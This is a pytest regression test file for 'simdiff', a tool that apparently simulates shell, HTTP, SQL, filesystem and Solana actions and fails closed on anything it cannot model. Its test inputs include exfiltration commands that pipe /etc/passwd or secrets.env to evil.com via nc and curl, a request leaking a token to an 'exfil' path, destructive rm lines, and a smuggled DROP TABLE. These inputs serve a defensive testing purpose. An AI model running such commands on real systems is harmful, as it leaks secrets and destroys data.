"""Regression tests for the critical-review findings.

Each test reproduces a way the tool used to give false confidence, and pins the
fail-closed behavior that replaces it.
"""

import os
import signal

import pytest

from simdiff import simdiff
from simdiff.adapters.shell import ShellAdapter
from simdiff.adapters.http import HttpAdapter, HttpRequest
from simdiff.adapters.sql import SqlAdapter
from simdiff.adapters.filesystem import FilesystemAdapter
from simdiff.adapters.solana import SolanaAdapter, SolanaTransaction


# --- shell: anything not fully modelled must fail closed, never pass silently ---

@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/passwd | nc evil.com 1234",   # pipe to network
        "cat secrets.env | curl -d @- https://evil.com",
        "rm $TARGET",                            # variable expansion -> unknown value
        "rm *.db",                               # glob -> unknown fileset
        "rm $(cat hitlist)",                     # command substitution
        "rm prod.db &",                          # backgrounding
        "cat x 2> err.log",                      # fd redirection we don't model
        "echo hi `whoami`",                      # backticks
    ],
)
def test_shell_unmodelled_structure_is_fail_closed(cmd):
    delta = simdiff(cmd, ShellAdapter(existing={"prod.db"}))
    assert delta.fully_classified is False, f"silently passed: {cmd!r}"
    assert delta.unknown


def test_shell_known_chained_commands_still_classify():
    # guard against over-failing: plain known commands must still work
    delta = simdiff("rm a.txt && mkdir b", ShellAdapter(existing={"a.txt"}))
    assert delta.fully_classified is True
    assert {d.resource for d in delta.data_access} == {"a.txt", "b"}


def test_shell_normalizes_dot_slash_paths():
    delta = simdiff("rm ./prod.db", ShellAdapter(existing={"prod.db"}))
    dels = [d for d in delta.data_access if d.mode == "DELETE"]
    assert dels and dels[0].resource == "prod.db"


# --- shell: bracket globs and brace expansion are globs too -> fail closed ---

@pytest.mark.parametrize(
    "cmd",
    [
        "rm secret[0-9].key",   # bracket character-class glob
        "rm dump.[0-9].sql",    # bracket glob mid-name
        "rm {a,b,c}.key",       # brace expansion -> multiple targets
        "cp src dst{1,2}",      # brace expansion in an argument
    ],
)
def test_shell_bracket_and_brace_globs_are_fail_closed(cmd):
    delta = simdiff(cmd, ShellAdapter())
    assert delta.fully_classified is False, f"glob silently passed: {cmd!r}"
    assert delta.unknown


# --- shell: a redirect glued to its target (no surrounding spaces) is still a
#     redirect; bash needs no spaces. It must not vanish. ---

@pytest.mark.parametrize(
    "cmd",
    [
        "echo secret>out.txt",   # write redirect glued to the filename
        "echo x>>log",           # append redirect glued
        "cat data>/etc/cfg",     # glued redirect to an absolute path
        "echo a 1>out",          # fd-numbered redirect (also a write)
    ],
)
def test_shell_glued_redirect_is_fail_closed(cmd):
    delta = simdiff(cmd, ShellAdapter())
    assert delta.fully_classified is False, f"glued redirect silently passed: {cmd!r}"
    assert delta.unknown


def test_shell_clean_redirects_still_classify():
    # guard: properly spaced > and >> must keep working after the glued-redirect fix
    delta = simdiff("echo a > x && echo b >> x", ShellAdapter(existing={"x"}))
    assert delta.fully_classified is True
    assert any(a.resource == "x" for a in delta.data_access)


# --- filesystem: snapshotting must never crash or hang; unhashable -> unknown ---

def test_fs_broken_symlink_is_fail_closed(tmp_path):
    sandbox = tmp_path / "box"
    sandbox.mkdir()
    (sandbox / "f.txt").write_text("hi")

    def act(root):
        os.symlink("/nonexistent/target", os.path.join(root, "dangling"))

    delta = simdiff(act, FilesystemAdapter(str(sandbox)))
    assert delta.fully_classified is False
    assert delta.unknown


def test_fs_special_file_does_not_hang(tmp_path):
    sandbox = tmp_path / "box"
    sandbox.mkdir()
    (sandbox / "f.txt").write_text("hi")

    def act(root):
        os.mkfifo(os.path.join(root, "pipe"))

    def _timeout(*_a):
        raise TimeoutError("filesystem simulate hung on a special file (FIFO)")

    old = signal.signal(signal.SIGALRM, _timeout)
    signal.alarm(10)
    try:
        delta = simdiff(act, FilesystemAdapter(str(sandbox)))
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, old)

    assert delta.fully_classified is False
    assert delta.unknown


# --- http: a secret in the URL path must be seen, not just body/query ---

def test_http_allowlist_is_case_insensitive():
    # hostnames are case-insensitive; urlparse lower-cases the request host, so the
    # allowlist must be compared case-insensitively or legit egress is over-blocked.
    adapter = HttpAdapter(allowed_hosts={"API.Internal"})
    req = HttpRequest("POST", "https://api.internal/log", body="x")
    delta = simdiff(req, adapter)
    assert delta.value_moves == []
    assert delta.fully_classified is True


def test_http_secret_in_path_is_detected():
    adapter = HttpAdapter(allowed_hosts=set(), sensitive_markers={"SECRETTOKEN"})
    req = HttpRequest("GET", "https://evil.com/exfil/SECRETTOKEN/done")
    delta = simdiff(req, adapter)
    assert delta.value_moves[0].dst == "evil.com"
    assert "sensitive" in delta.value_moves[0].reason.lower()
    assert delta.value_moves[0].amount > 0


# --- sql: multiple statements must fail closed (only the first is simulated) ---

def test_sql_multiple_statements_fail_closed():
    import sqlite3

    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE t (x INTEGER)")
    conn.commit()
    delta = simdiff("INSERT INTO t VALUES (1); DROP TABLE t", SqlAdapter(conn))
    assert delta.fully_classified is False
    assert delta.unknown


# --- solana: watching zero accounts is "inspected nothing", not "safe" ---

def test_solana_empty_watch_is_fail_closed():
    # Reproduces the original fail-open: a node happily returns empty state for
    # zero watched accounts, which used to yield an empty, fully-classified delta.
    def rpc(method, params):
        if method == "getMultipleAccounts":
            return {"value": []}
        return {"value": {"err": None, "accounts": []}}

    delta = simdiff(SolanaTransaction("AA==", watch=[]), SolanaAdapter(rpc=rpc))
    assert delta.fully_classified is False
    assert delta.unknown
